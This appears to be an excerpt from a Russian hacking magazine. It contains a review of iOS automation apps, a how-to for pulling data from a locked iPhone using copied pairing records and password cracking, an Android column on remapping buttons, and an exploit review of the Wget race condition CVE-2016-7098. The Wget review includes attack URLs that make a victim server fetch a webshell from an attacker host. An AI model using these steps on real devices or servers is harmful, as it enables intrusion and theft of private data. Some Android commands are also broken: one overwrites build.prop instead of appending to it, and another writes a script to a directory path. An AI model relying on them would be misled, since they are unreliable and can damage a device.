ВНЕШНИЙ ВИД
Начнем c  IFTTT. Два окна
(Manage  и  Browse), меню
создания нового условия, не-
сколько служебных окон —
все, что предлагает данная
утилита. Казалось бы, немно-
го, зато удобно и все на по-
верхности. Просто и понятно
организовано   добавление
новых  действий  (которые
с недавнего времени носят                        Готовые решения Workflow
имя Applets) из магазина го-
товых решений.
   Интерфейс Launch Center
Pro чуть сложнее. Все рабо-
чее пространство представ-
ляет собой поле 4 х 5, в ка-
ждой ячейке которого могут
находиться иконки действий.
В правом верхнем  углу —
кнопка редактирования, соз-
давать новые иконки мож-
но только на пустом месте
(удивляет отсутствие рабочих
столов). Иконки расположе-
ны в произвольном порядке.
   При их создании есть не-
сколько  настроек:  значок,
график выполнения, ссылка
и, разумеется, выбор соот-
ветствующего действия.
   Имеется несколько пара-
метров внешнего вида. Мож-
но выбрать тему оформления
(светлая, темная и классиче-
ская), есть вкладка управле-
ния виджетом, резервными
                                                             Настройки IFTTT
копиями,  присутствует  па-
нель  редактирования  мест
(для  привязки  выполнения
действий к конкретной локации).
   Особого внимания заслуживает панель редактирования расположения
иконок. Концепция группировки по папкам сходна с рабочим столом iOS, и,
казалось бы, разработчики могли сделать этот процесс похожим на стандарт-
ное решение. Однако они пошли другим путем. Для начала редактирования
необходимо нажать кнопку в правом верхнем углу. Затем можно перетаски-
вать действия, но трудности могут возникнуть при перемещении их в папку.
Для этого необходимо зайти в само действие (одинарное нажатие на иконке),
после этого перелистать список функций вниз и выбрать Move Action. Откро-
ется панель, где мы можем выбрать соответствующую папку. Теперь одинар-
ным нажатием располагаем действие на одном из свободных мест. Для пе-
ремещения уже имеющихся в папке действий потребуется перейти в режим
редактирования, затем сделать одинарное нажатие на папке и дальше управ-
лять расположением иконок, как и на главном экране, перетаскиванием.
   Встроенный виджет программы в «Центре уведомлений» дает возможность
иметь доступ к наиболее часто используемым действиям. Как и говорилось
ранее, редактировать его можно из самой программы.
  В   целом   интерфейс
Launch Center понятен, одна-
ко к управлению расположе-
нием иконок придется при-
выкнуть. Поиска тут нет, что,
по нашему мнению, тоже не-
достаток.
   Workflow  имеет  самый
сложный  интерфейс  сре-
ди  всех  рассматриваемых
программ, однако заметно,
что разработчики старались
сделать утилиту  как можно
более простой в использо-
вании. Основной экран пред-
назначен  для  размещения
всех действий. На нем можно
их дублировать (для после-
дующей модификации), пе-
реставлять, удалять и пере-
именовывать. Есть и вторая
вкладка — с готовыми реше-
ниями.
  Меню создания действия
напоминает окно Automator.
                                                 Группа действий Launch Center Pro
Слева  расположены  дей-
ствия и их папки, справа —
рабочее      пространство.
Действия добавляются перетягиванием. Выполнение каждого блока можно
поставить в зависимость от разнообразных параметров, от значений пере-
менных или логических операторов. Есть три типа действий: обычное дей-
ствие, виджет, расширение (доступно в меню «Поделиться»). Здесь же имеет-
ся и кнопка для запуска процесса.
   Есть и виджет Workflow, где размещены ссылки. Наиболее популярные дей-
ствия подбираются автоматически.
  По личному опыту скажем: программа быстро становится удобной и понят-
ной, хотя сперва может показаться несколько запутанной. Сортировка и чет-
кое разграничение функций каждого окна делают ее использование приятным.

Функциональность

Launch Center Pro:
• Быстрый доступ к одному из встроенных действий с панели управления.
• Доступ к действиям при помощи виджета.
• Задание графика выполнения действий.
• Привязка их запуска к определенным местам.
• Сортировка иконок по папкам.

IFTTT:
• Доступ к готовым решениям.
• Создание действий, активируемых при выполнении определенных условий.
• Доступ к функциям многих сторонних приложений.

Workflow:
• Создание и сортировка действий.
• Доступ к большому количеству готовых решений.
• Создание последовательностей действий.
• Использование параметров, переменных, логических операторов.
• Создание иконки действия на рабочем столе и в панели Launch Center Pro.
• Встроенный виджет с доступом к самым популярным вариантам.


ПРИМЕР ИСПОЛЬЗОВАНИЯ
Представим следующую ситуацию. Необходимо сделать несколько скриншо-
тов на iPad, затем уменьшить их размер вдвое, добавить их в специальный от-
дельный альбом и прислать уведомления о добавлении каждого. Попробуем
реализовать все это таким образом, чтобы задействовать все обозреваемые
программы.
   Начнем с Workflow. Выберем, каким критериям должны соответствовать
снимки экрана. Они могут иметь два разрешения: 1536 х 2048 и 2048 х 1536.
Перейдем в Workflow. Создадим новое действие. Для начала перетащим на ра-
бочую панель два одинаковых
условия — Find Photos. В пер-
вом выберем два параметра:
высота и ширина фото долж-
на быть 2048, причем через
фильтр проходят изображе-
ния, которые соответствуют
любому из данных критери-
ев. Поэтому установим ввер-
ху панели Any of the following
are  true. Во втором случае
настройки будут аналогичны-
ми, вот только вместо 2048
установим  параметр  1536.
Для того чтобы фото не до-
бавлялись по несколько раз,
можно установить третье ус-
ловие. Перетягиваем третий
блок Find Photos, здесь выби-
раем параметр «Album is not
(название альбома со скрин-
шотами)». Теперь выбираем
Resize Image и устанавлива-
ем  необходимые  значения
по высоте и ширине фотогра-
фии. Финальным шагом будет                    Конструктор действия Workflow
установка блока Save to photo
album, где из списка выбира-
ем необходимый альбом.
   Действие  готово. Поме-
стим его на панель Launch
Center Pro для быстрого за-
пуска. Выбираем на панели
с запуском действия значок
настроек  и жмем  Add  to
Launch  Center.  Нажимаем
на пустую ячейку, действие
добавляется, Workflow откры-
вается автоматически. Воз-
можно, пользователь будет
забывать вовремя выполнять
только что созданное дей-
ствие, потому сделаем так,
чтобы периодически наличие
новых скриншотов проверя-
лось в автоматическом режи-
ме. Снова перейдем в Launch
Center, выберем настройки
действия,  далее  Schedule,
затем Every Day. Можно уста-
новить и дату начала дей-
ствия.
                                                  Настройки действия Workflow
   Последним  шагом   до-
бавим  отправку  уведомле-
ний при  запуске. Перейдем
в IFTTT, выберем новое дей-
ствие. Как условие установим
New photo added to album (ука-
зав свой альбом), а при вы-
полнении условия дадим ко-
манду присылать уведомления
в  Notification Center. Активи-
руем условие, а для удобства
(чтобы не держать IFTTT от-
крытым) перейдем в настрой-
ки iOS, выберем «Основные»,
затем «Обновление контента»,
пролистаем до IFTTT и вклю-
чим его.
  Наша    последователь-
ность готова. Каждый день
будет проверяться наличие
скриншотов. Все они будут
добавляться в специальный
альбом, а в «Центре уведом-
лений»  будет  создаваться
уведомление об этом. Что-
бы все это работало, в фоне
должны  быть  и  Workflow,                                 Действие IFTTT
и Launch Center.

АВТОМАТИЗАЦИЯ ПО-ДРУГОМУ:
ЗАПИСЬ ДЕЙСТВИЙ ПОЛЬЗОВАТЕЛЯ
Несколько иной вид автоматизации основан на записи и последующем вос-
произведении действий пользователя. Обычные приложения такого не умеют,
но могут jailbreak-твики. Первым твиком такого рода был AutoTouch, рассмо-
трим принцип его работы.
   Интерфейс      состоит
из трех окон: настроек, мага-
зина и списка созданных или
купленных последовательно-
стей. Для записи нового дей-
ствия выберем способ акти-
вации            AutoTouch.
Используем    для    этого
Activator, который устанавли-
вается вместе с рассматри-
ваемой утилитой. Затем от-
крываем экран, с которого
будет выполнено действие,
и делаем выбранный жест.
Откроется меню AutoTouch,
начинаем запись твоих дей-
ствий. Для завершения дела-
ем все тот же жест Activator.
После этого последователь-
ность сохранится, и ее мож-
но   будет   воспроизвести
в любой момент.
   Важно помнить: для пра-
вильного  воспроизведения
необходимо  быть  именно                            Настройки AutoTouch
на том экране, с которого на-
чалась  запись.  Программа
будет удобна для автоматической установки настроек в про-
граммах, где функция копирования параметров не предусмо-
трена. Также во встроенном магазине найдется большое ко-
личество ботов для всевозможных игр, в последнее время это
стало основным способом применения AutoTouch.
                                    WWW
ЗАКЛЮЧЕНИЕ                                                                                       Workflow
К сожалению, сейчас возможности автоматизации на iOS неве-
лики, однако разработчики выжимают все возможное из мобиль-   Launch Center Pro
ных «яблочных» устройств. Потому, несмотря на ограничения ра-
                                                                                         IFTTTботы программ в фоновом режиме и многозадачности в целом,
создать и регулярно выполнять последовательности действий       AutoTouch
в iOS все же можно. Для этого разработано несколько эффек-
тивных инструментов, каждый из которых может использоваться
                                             ЦЕНЫв сочетании с другими.

                                                                                     Workflow — 3$;
                                                                              Launch Center — 5$;
                                                                                         IFTTT — бесплатно;
                                                                                 AutoTouch — 5$
MOBILE





                                                                                    Олег Афонин,
                                                                                             Эксперт по мобильной
                                                                                           криминалистике компании
                                                                                            Элкомсофт
                                                                                                         aoleg@voicecallcentral.com

ПАРОЛЬ
НЕ НУЖЕНВЗЛАМЫВАЕМ ЗАБЛОКИРОВАННЫЙ
IPHONE, ИСПОЛЬЗУЯ ДЕПОНИРО-
ВАННЫЙ КЛЮЧ



С каждым новым поколением устройств и с каждой новой
версией iOS взломать мобильные устройства Apple ста-
новится все сложнее. И если для 32-битных устройств до-
статочно было установить jailbreak, чтобы получить полный
доступ к файловой системе, то уже начиная с iPhone 5s
хакеры сталкиваются с рядом ограничений. А что делать,
если исследуемый iPhone заблокирован паролем? Про
способы обхода блокировки обманом датчика отпечатков
пальцев мы писали в одном из прошлых выпусков. Сегодня
же мы рассмотрим еще один способ обхода блокировки —
на сей раз с использованием депонированных ключей.

ЧТО ТАКОЕ ДЕПОНИРОВАННЫЙ КЛЮЧ
С точки зрения пользователя, депонированный ключ (он же lockdown file или
pairing record) — это то, что избавляет от необходимости каждый раз разбло-
кировать телефон при проводном подключении к компьютеру для синхрониза-
ции с iTunes. Во время первого подключения телефон выдаст запрос: «Дове-
рять этому компьютеру?» При положительном ответе (чтобы ответить, нужно
сперва разблокировать телефон) будет создана пара криптографических клю-
чей, один из которых передается на компьютер (и сохраняется приложени-
ем iTunes в виде файла), а второй шифруется с использованием аппаратного
ключа и сохраняется в Secure Enclave (сразу скажу: извлечь и расшифровать
вторую половинку пока не удалось никому).
   Доверенные компьютеры могут синхронизироваться с устройством iOS,
создавать резервные копии (обрати внимание на этот пункт!) и получать до-
ступ к фотографиям, видеороликам, контактам и другому контенту на устрой-
стве. Доверенные компьютеры сохраняют свой статус до тех пор, пока поль-
зователь не изменит список доверенных компьютеров или не сотрет данные
с устройства iOS.
   Компьютер, удаленный из списка доверенных, теряет доступ к содержимо-
му на устройстве: iOS уничтожает вторую половинку ключа — ту, которая хра-
нится в телефоне. Без нее депонированный ключ, лежащий на компьютере,
оказывается совершенно бесполезным.
   Важно, что доверенный статус сохраняется и после выключения или пере-
загрузки телефона — но только при условии, что телефон после этого хоть раз
разблокировали. Еще один важный момент: доверенные отношения остаются
и после смены пароля.
  И наконец, самый важный момент: депонированный ключ — это всего лишь
файл. Незашифрованный и не привязанный к определенному железу — в от-
личие от второй половинки, которая хранится в телефоне. Если скопировать
его на другой компьютер, его можно использовать для установки связи с теле-
фоном, в том числе создания бэкапа.

Историческая справка

iOS 7 и старше. В старых версиях iOS достаточно было добавить компьютер
в список доверенных один раз. Смартфон не создавал пару ключей, а пере-
давал на компьютер аппаратный ключ, позволяющий безусловно разблоки-
ровать устройство (в том числе сразу после его включения или перезагрузки).
Отозвать доверенные отношения или удалить компьютер из списка доверен-
ных было невозможно; созданный на компьютере файл продолжал выполнять
свои функции даже после сброса устройства к заводским настройкам. Именно
эта возможность позволяла Apple копировать данные из устройств, которые
в компанию присылала полиция.

iOS 8 и более новые. В какой-то момент Apple надоело вытаскивать для по-
лицейских данные из многочисленных телефонов. Да и репутация страдала.
Поэтому в iOS 8 механизм установления доверенных отношений был полно-
стью переработан. Теперь создается не один, а пара ключей и доверенные от-
ношения могут быть как отозваны пользователем в настройках устройства, так
и уничтожены после сброса к заводским настройкам. Кроме того, поскольку
на устройствах под управлением iOS используется шифрование раздела дан-
ных, для установления связи с компьютером из списка доверенных обязатель-
но, чтобы устройство было разблокировано хотя бы раз после загрузки.


СРОК ДЕЙСТВИЯ ДЕПОНИРОВАННЫХ КЛЮЧЕЙ
Официальная документация Apple часто умалчивает о некоторых вещах. В раз-
ных источниках встречаются разные догадки по поводу того, когда и при каких
обстоятельствах могут «сгорать» ключи. Мы проверили, как обстоят дела в ре-
альности, и вот что получилось.

Депонированные ключи действительны 48 часов с момента
последней разблокировки?
Ничего подобного. В нашей лаборатории есть устройства, работающие под
всеми версиями iOS. Мы провели тщательную проверку, протестировав iPhone
с iOS 8.1, 9.1, 10.1 и заканчивая третьей бета-версией iOS 10.2. Все устрой-
ства получилось разблокировать с помощью депонированного ключа спустя
48, а потом и 96 часов с момента последней разблокировки.

Депонированные ключи действительны 30, 60 или 90 дней?
Тоже нет. Ждать три месяца мы не стали, а просто подключили к компьютеру
несколько телефонов, которые лежали в лаборатории с лета. Все устройства
без проблем разблокировались депонированными ключами.
  Все это хорошо, но нужно понимать, что Apple — хозяева ситуации. Компа-
ния полностью контролирует программную и аппаратную составляющие своих
устройств и может в любой момент ввести любые ограничения по срокам дей-
ствия депонированных ключей.

КАК ВЗЛОМАТЬ IPHONE С ПОМОЩЬЮ ДЕПОНИРОВАННЫХ
КЛЮЧЕЙ
С теорией разобрались. Давай попробуем разблокировать телефон с помо-
щью депонированного ключа, скопированного с доверенного компьютера.
Для этого воспользуемся инструментарием Elcomsoft iOS Forensic Toolkit.
   У тебя не получится использовать депонированный ключ для разблокиров-
ки экрана. Ключи используются исключительно для синхронизации с iTunes
и для создания резервных копий. Твоя цель — заставить телефон создать ре-
зервную копию на твоем компьютере и вытащить из нее данные.
   Для начала коротко о том, какие бывают бэкапы. (Не пропускай эту часть,
даже если в курсе про iCloud и локальные копии, — есть неочевидный момент.)
Самый удобный и популярный механизм — бэкапы в iCloud. Но сохраняется
и старый способ, когда копию данных можно сохранить локально. При этом за-
щита облачных резервных копий весьма условна (пароля нет, шифрование есть,
но ключ лежит рядышком с основными данными — бери и пользуйся). А вот ло-
кальные бэкапы можно зашифровать паролем. А можно не зашифровать.
  Старым способом мало кто пользуется. Многие про него вообще не зна-
ют. Если владелец телефона ни разу не создавал локальную резервную ко-
пию в iTunes (а пользовался только облачным резервным копированием или
не пользовался вовсе), то пароль на резервные копии, скорее всего, будет пу-
стым. Это означает две вещи. С одной стороны, резервная копия без паро-
ля сохраняется в незашифрованном виде. С другой — часть данных (keychain)
все-таки будет зашифрована, причем для шифрования будет использован
стойкий аппаратный ключ, который хранится в самом устройстве и который
невозможно извлечь или взломать (с оговоркой: извлечь аппаратный ключ
все-таки можно, но только из старых 32-разрядных устройств без Secure
Enclave и только при использовании jailbreak, установить который невозможно
без разблокировки паролем).
   Если же владелец указал пароль для создания резервных копий, то все по-
следующие резервные копии будут зашифрованы с использованием этого
пароля. При этом с помощью пароля шифруются почти все данные, включая
большую часть содержимого keychain.
  А теперь подумай, что лучше: незашифрованный бэкап, в котором недо-
ступны сохраненные пароли и прочие интересные вещи, или же бэкап с паро-
лем, который можно расшифровать целиком? Полагаю, второй вариант при-
влекательнее!
   Так что если пароль на резервную копию не установлен, не поленись устано-
вить временный. Если же для снятия бэкапа ты используешь Elcomsoft iOS Forensic
Toolkit, то приложение установит временный пароль 123 автоматически.
  Еще один важный момент. Если пароль на резервные копии уже установ-
лен, то сменить или снять его можно только после ввода именно этого пароля.
В противном случае пароль можно сбросить исключительно методом сброса
устройства к заводским установкам с полной потерей данных.
   Если бэкапы защищены паролем, все данные шифруются непосредственно
на самом устройстве. Наружу выдается уже зашифрованный поток. iTunes или
Elcomsoft iOS Forensic Toolkit выступает в роли простого приемника, сохраня-
ющего зашифрованный поток в файлы.

ТЕХНОЛОГИЯ ВЗЛОМА
Чтобы все получилось, необходимы три условия:
1. У тебя на руках оказался iPhone, iPad или iPod Touch (любого поколения),
   на котором работает iOS версии с 8.x по 10.x.
2. Устройство попало в твои руки во включенном состоянии, после чего ни разу
   не выключалось и не перезагружалось (метод сработает только в том слу-
   чае, если телефон разблокировался хотя бы раз после включения или пере-
   загрузки).
3. У тебя есть доступ к компьютеру с установленным приложением iTunes, с ко-
   торым синхронизировался телефон.

Извлекаем ключи
Ключи хранятся в следующих папках:
•  Windows Vista, 7, 8, 8.1, Windows 10: %ProgramData%\Apple\Lockdown (при-
  мер пути: C:\ProgramData\Apple\Lockdown\6f3a363e89aaf8e8bd293ee8
   39485730344edba1.plist);
•  Windows XP: %AllUsersProfile%\Application Data\Apple\Lockdown (при-
  мер пути: C:\Documents and Settings\All Users\Application Data\
   Apple\Lockdown\6f3a363e89aaf8e8bd293ee839485730344edba1.plist);
•  macOS: /var/db/lockdown.

Внимание: macOS Sierra защищает доступ к депонированным ключам; для ко-
пирования используй sudo  cp  /var/db/lockdown/{id}.plist  [целевой
путь].
   Папки содержат файлы, названия которых соответствуют идентификатору
устройства в формате UUID. Файлы имеют расширение .plist. Если UUID теле-
фона неизвестен, определить его можно с помощью команды I в iOS forensic
Toolkit. UUID будет сохранен в XML-файле в следующем виде:





Создаем бэкап
1. Запусти Elcomsoft iOS Forensic Toolkit командой Toolkit-JB.
2. Подключи телефон к компьютеру.
3. В iOS Forensic Toolkit выбери B — Create iTunes-style backup of the device.
   Если команды нет, проверь версию утилиты: должна быть 2.1 или новее. На-
   помним, запускай Toolkit-JB, а не Toolkit.
4. Если телефон заблокирован, программа запросит путь к депонированному
   ключу. Укажи путь к файлу.
5. Если пароль на резервную копию пуст, iOS Forensic Toolkit автоматически
   использует временный пароль 123. В этом случае ломать пароль не потре-
   буется; можно переходить непосредственно к просмотру и анализу резерв-
   ной копии.
6. Если же владелец поставил пароль на бэкап, то пароль придется ломать.
   Для этого есть Elcomsoft Phone Breaker с его словарными атаками и исполь-
   зованием видеокарт в качестве ускорителей. (Кстати, а ты в курсе, что сло-
   варик 10 тысяч самых распространенных паролей можно спокойно скачать?)


                                                                            Toolkit-JB





Ломаем пароль от бэкапа
Мы уже писали, как взламываются пароли от бэкапов iOS. Повторяться не бу-
дем, но про некоторые новинки рассказать не грех.
  В iOS 10 и 10.1 появилась дыра в безопасности: вместо 10 тысяч итера-
ций проверки пароля используется одна. Если на телефоне стоит одна из этих
версий iOS, пароли будут перебираться очень быстро.
  В iOS 10.2 Beta эту уязвимость уже закрыли, а количество итераций даже
увеличили — на некоторых устройствах до 50 тысяч раз. Соответственно, пе-
ребор будет медленнее.
  Но и в этом случае потеряно не все. Во-первых, можно нарастить мощ-
ность и использовать видеокарты для ускорения перебора. Во-вторых, можно
использовать словарь, составленный из других паролей того же пользователя
(а вот как можно собрать такой словарик сканированием компьютера — тема
для отдельной статьи).
   Наконец, можно использовать готовый словарь из самых распространен-
ных паролей.


                                                               Ломаем
                                                                     пароль





                                                                   Пароль
                                                                    найден





10 тысяч паролей
Согласно статистике, каждый третий пароль можно взломать атакой по сло-
варю из всего 10 тысяч слов. Такой словарь для английского языка доступен
здесь. Существует и более полный вариант этого словаря, в котором содер-
жится 10 миллионов паролей, но его использование сомнительно. Та же стати-
стика говорит, что увеличение объема словаря в тысячу раз дает пренебрежи-
мо малый прирост вероятности взлома: если по словарю из 10 тысяч паролей
можно взломать до 30% паролей, то расширенный словарь приведет к успеху
в 33% случаев. Большого смысла нет.
   Зная пароль, расшифровать бэкап с использованием Elcomsoft Phone
Breaker — дело нескольких минут.

ЧТО ВНУТРИ?
Посмотрим на содержимое бэкапа с помощью Elcomsoft Phone Viewer. Бу-
дем считать, что пароль тебе известен; его нужно будет ввести (если только
ты не расшифровал бэкап в другой программе):





После открытия ты сможешь просмотреть контакты, звонки, события календа-
ря, фотографии, пароли, историю браузера, закладки и многое другое.

ЗАКЛЮЧЕНИЕ
Как видишь, обходные пути для взлома заблокированных iPhone пока что есть.
Да, ситуация усложняется, но очень небыстро. На сегодняшний день депони-
рованные ключи продолжают работать и не «протухают» со временем. Правда,
использовать их получится только с телефонами, которые владелец разбло-
кировал хотя бы единожды после загрузки, но с этим ничего поделать нельзя:
данные зашифрованы, а ключ шифрования зависит от пароля.

Программы

Elcomsoft iOS Forensic Toolkit

Elcomsoft Phone Breaker

Elcomsoft Phone Viewer


Ссылки

О предупреждении «Доверять этому компьютеру» на устройстве iPhone, iPad
или iPod touch

iOS logical acquisition: the last hope for passcode-locked devices?

iOS 8.3: the end of iOS forensics?

iOS 8 and its impact on investigations

iOS lockdown diagnostics Services

Counter-forensics: pair-lock your device with apple’s configurator
MOBILE: Колонка Евгения Зобнина
 СКАЗ
 О ТРЕХ
КНОПКАХ





                       Евгений Зобнин
                                                      zobnin@gmail.com





 Когда мне в очередной раз достался смартфон с хардварными клавишами на-
 вигации, вообще без возможности их настройки или активации экранных кла-
 виш в стиле Nexus, я решил, что с этим надо что-то делать. Покопавшись пару
 часов во внутренностях Android, я отключил надоедливую подсветку, поменял
 клавиши «Назад» и «Обзор» местами, а потом включил экранные кнопки и об-
 рел покой.
   Сразу оговорюсь: я большой поклонник идеи экранных клавиш навигации.
 Всех этих домиков, стрелочек и квадратиков, нарисованных прямо в нижней
 части экрана. Да, они отнимают какое-то там пространство (которое, впрочем,
 в большинстве случаев не особо и нужно), да, возможно они портят внешний
 вид приложений, но, черт возьми, они динамические.
   Экранные кнопки навигации поворачиваются вместе с экраном, исчезают,
 когда они не нужны, меняют цвет и органично встраиваются в интерфейс до-
 машнего экрана. Если отбросить саму идею бесполезности существования
 сразу трех кнопок (в конце концов, яблочники обходятся одной и не чувствуют
 себя обездоленными) и довольно-таки удобные системы навигации вроде PIE
 или «пузыря навигации MIUI», то экранные кнопки — это лучшее, что было при-
 думано до сих пор.
    Так вот. Почему-то мою замечательную,
 прекраснейшую идею о том, что лучше наэ-
 кранных кнопок нет ничего, не разделяют ну
 очень многие производители смартфонов.
 И даже не просто не разделяют, а не разде-
 ляют совершенно чудовищным способом,
 заставляя пользоваться смартфоном с сен-
 сорными кнопками (ААА!), снабженными ди-
 намической подсветкой (ААА-2!) и кнопкой
 «Назад» с правой стороны экрана (ААА-3:
 решающий удар).
   Ситуация неприемлемая до крайности,
 а учитывая, что добрый разработчик про-
 шивки не предусмотрел никаких настроек
 для активации экранных клавиш и настроек
 для управления сенсорными кнопками, при-
 шлось обойтись своими силами. Было два
 варианта дальнейших действий:
 •  привести сенсорные кнопки к нужному
   состоянию, а именно отключить подсвет-
    ку и перенести клавишу «Назад» на ле-    Удобное круговое меню
                                                 навигации в MIUI
   вую сторону (пусть она выглядит как «ква-
    драт», так даже интересней);
 •  отключить сенсорные кнопки полностью и активировать наэкранные кнопки.

 Сторонние инструменты я не люблю, поэтому решение сделать все своими
 руками пришло само собой.

СПОСОБ НОМЕР ОДИН. НАСТРАИВАЕМ СЕНСОРНЫЕ КНОПКИ
 Для начала попробуем отключить подсветку кнопок. Для этого нам нужен root,
 эмулятор терминала и каталог /sys в корне файловой системы. Именно такая
 комбинация. Мы имеем дело с ядром Linux, а в системах на его основе вся
 важная информация о железе, а также «тумблеры», им управляющие, обычно
 находятся в файловой системе sysfs, подключенной к каталогу /sys.
   Собственно, sysfs — это даже не файловая система, точнее, она файло-
 вая, но оперирует так называемыми синтетическими файлами. А они не хра-
 нятся на диске, это своего рода интерфейс общения с драйверами: прочитал
 файл — получил данные о железке, записал — изменил какую-то настройку.
 А для записи как раз таки нужны права root.
    Итак, получаем root, запускаем эмулятор терминала (а лучше ADB). И пи-
 шем следующее:

 # su
 # cd /sys

 Теперь мы в каталоге /sys, далее нужно найти каталог, в котором находятся
 файлы драйвера подсветки кнопок:

 # find -name \*button\*
 ./leds/button-backlight

 Бинго! Это каталог /sys/class/leds/button-backlight. Переходим в него и смо-
 трим, что внутри:

 # cd /sys/class/leds/button-backlight
 # ls
 brightness
 device
 max_brightness
 power
 subsystem
 trigger
 uevent

 Ставлю свой Nokia 3310 на то, что файл brightness — это текущая яркость кно-
 пок, а max_brightness — максимальная. Проверим догадку, записав в первый
 файл значение 100 (ну типа 100%, хотя какая там шкала — неизвестно):

 # echo 100 > brightness

 Отлично, кнопки горят и даже не собираются тухнуть.
 Момент истины — пишем в файл max_brightness значение 0:

 # echo 0 > max_brightness

 Кнопки погасли, навсегда, как и лампочка в моем подъезде вчера ночью.
 Но так же, как лампочка, они снова могут загореться, если перезагрузиться.
 То есть команда действует только в текущем сеансе работы. К счастью, это
 не беда, мы поместим нашу команду в скрипт на карте памяти:

 # mkdir /sdcard/boot
 # echo ’echo 0 > /sys/class/leds/button-backlight/max_brightness’ >
     /sdcard/boot

 А его, в свою очередь, поставим в автозагрузку с помощью  init.d scripts
 support. Запускаем приложение, выбираем первые три галочки, c помощью
 опции Select folder выбираем каталог boot на карте памяти.





                                                             Ходим по sysfs


 Ползадачи выполнено, осталось поменять
 местами кнопки «Назад» и «Обзор». Для это-
 го необходимо изменить раскладку кнопок.
 В Android она лежит в нескольких файлах ка-
 талога /system/usr/keylayout/. Их довольно
 много,  но  если  отбросить файлы  типа
 Vendor_2378_Product_100a.kl  и   qwerty.kl
 (они   хранят   раскладки   полноценных
 Qwerty-клавиатур, которые Android поддер-
 живает из коробки), то останется от силы
 пять штук.
   Один из них как раз нам и нужен. Часто
 смартфоны используют файл  ft5x06_ts.kl,
 специфичный  для  контроллера  тачскри-
 на FT5x06 (pdf) (кнопки же сенсорные, пра-
 вильно), но в моем случае им оказался файл
 Vendor_2378_Product_100a.kl.
   Если открыть этот файл, можно увидеть
 три искомые строки:

 key 158    BACK          VIRTUAL                                   init.d scripts support
 key 139    MENU          VIRTUAL
 key 102    HOME          VIRTUAL

 Остается только поменять числа 158 и 139 местами (для этого подходит лю-
 бой файловый менеджер с поддержкой прав root). После перезагрузки новая
 раскладка начнет действовать.

СПОСОБ НОМЕР ДВА. ЭКРАННЫЕ КЛАВИШИ
 Здесь все еще проще. В Android существует специальная отладочная пере-
 менная qemu.hw.mainkeys, которая позволяет контролировать видимость наэ-
 кранных клавиш навигации. Если она имеет значение 0, клавиши будут показа-
 ны на экране, 1 — обратный эффект.
   Записываем переменную с нужным значением в файл /system/build.prop,
 и на этом все:

 # su
 # mount -o remount,rw /system
 # cp /system/build.prop /system/build.prop.bak
 # echo qemu.hw.mainkeys=0 > /system/build.prop

 Далее можно «отключить» хардварные кнопки, выключив их подсветку, как мы
 это сделали в первом способе. Возможно, конечно, существует вариант вы-
 ключить их полностью, но найти его не удалось.

ВЫВОДЫ
 Вот на такие преступные шаги иногда приходится идти, чтобы сделать смарт-
 фон чуточку удобнее. Что касается меня, то я остановился на третьем вари-
 анте: «выключил» кнопки плюс установил LMT Launcher. Как мне кажется, это
 наиболее удобный способ управления.
ВЗЛОМ





                                                                               Борис Рютин,
                                                                                                                              Digital Security
                                                                                                        b.ryutin@dsec.ru
                                                                                       @dukebarman
     WARNING                                                                       dukebarman.pro

       Вся информация
     предоставлена исклю-
       чительно в ознако-
       мительных целях.
     Ни редакция, ни автор
     не несут ответственно-
      сти за любой возмож-
    ный вред, причиненный
      материалами данной
             статьи.

ОБЗОР
ЭКСПЛОИТОВ
   АНАЛИЗ НОВЫХ УЯЗВИМОСТЕЙ





     Сегодня мы разберем уязвимости в популярных утилитах
 для скачивания файлов — Wget и aria2. При соблюдении некоторых
   условий атакующий может выполнить произвольный код. Также
   разберем ошибку в LSASS.EXE, которая позволяет как минимум
перевести систему в режим перезагрузки, а как максимум — получить
                  повышение привилегий.

ACCESS LIST BYPASS / RACE CONDITION В WGET

 CVSSv2:     Нет
 Дата релиза: 24 ноября 2016 года
 Автор:      Дэвид Голунски (Dawid Golunski)
 CVE:         CVE-2016-7098

Я думаю, нет смысла рассказывать, что такое Wget, — все, кто пользовался
командной строкой UNIX или Linux, неоднократно запускали эту утилиту. Об-
наружение уязвимостей в столь популярных программах никогда не остается
без внимания.
   Wget версии 1.17 или младше в режиме зеркалирования (mirroring) или ре-
курсивной загрузки подвержена уязвимости типа race condition, что позволя-
ет удаленному атакующему обойти ограничения, указанные через параметр
-A. Таким образом атакующий может поместить вредоносный файл в систему.
В зависимости от приложения и директории загрузки такая ошибка может при-
вести к плачевным последствиям — к примеру, выполнению кода.
   Когда Wget используется в режиме рекурсивной загрузки или зеркалирова-
ния, то согласно документации может получить следующий список параметров
доступа. Вот параметры запрета и разрешения рекурсивной загрузки:

-A acclist --accept acclist
-R rejlist --reject rejlist

Далее указывается разделенный запятыми список суффиксов или паттернов
имен файлов, которые следует или не следует загружать. Любые специальные
символы *, ?, [ или ], обнаруженные в одном из элементов acclist или rejlist,
будут интерпретироваться скорее как паттерн, чем как суффикс.
   Например, это можно использовать для загрузки только JPG:

# wget -r -nH -A '*.jpg' http://attackersvr/test.php
Resolving attackersvr... 192.168.57.1
Connecting to attackersvr|192.168.57.1|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]
Saving to: "test.php"
15:05:46 (27.3 B/s) - "test.php" saved [52]

В конце будет удален test.php, потому что согласно правилу его не следует за-
гружать.
   Несмотря на то что Wget удаляет файл в конце загрузки, это создает race
condition. Атакующий, контролируя удаленный сервер, может преднамеренно
замедлить загрузку так, чтобы у него появился шанс использовать вредонос-
ный файл перед тем, как тот будет удален.

EXPLOIT
Ниже показано уязвимое веб-приложение, которое использует Wget для загруз-
ки изображений с предоставленного пользователем адреса.





Пример вредоносного URL:

https://victimsvr/image_importer.php?imgurl= href="http://
   images/logo.jpg">http://images/logo.jpg

Файл logo.jpg будет загружен и размещен по адресу https://victimsvr/
images_uploads/logo.jpg. Белый список Wget гарантирует, что будут загруже-
ны только файлы с расширением jpg.
  Тем не менее уязвимость race condition в Wget позволяет атакующему загру-
зить произвольный скрипт (к примеру, на PHP) в директорию /image_uploads
и успешно выполнить код. Ниже представлены только части, полный код экс-
плоита ты можешь скачать с сайта его автора.
   Полезная нагрузка:





Поднять свой HTTP-сервер:





Атакующий запускает этот эксплоит на своем сервере (attackersvr) и указы-
вает его адрес в уязвимом скрипте image_importer.php:

https://victimsvr/image_importer.php?imgurl= href="http://
   attackersvr/webshell.php">http://attackersvr/webshell.php

  В результате получается следующий вывод:

root@attackersvr:~# ./wget-race-exploit.py
Wget < 1.18 Access List Bypass / Race Condition PoC Exploit
CVE-2016-7098
Dawid Golunski
https://legalhackers.com
[+} Exploit Web server started on HTTP port 80. Waiting for wget
   to connect...
[+] Got connection from wget requesting /webshell.php via GET :)
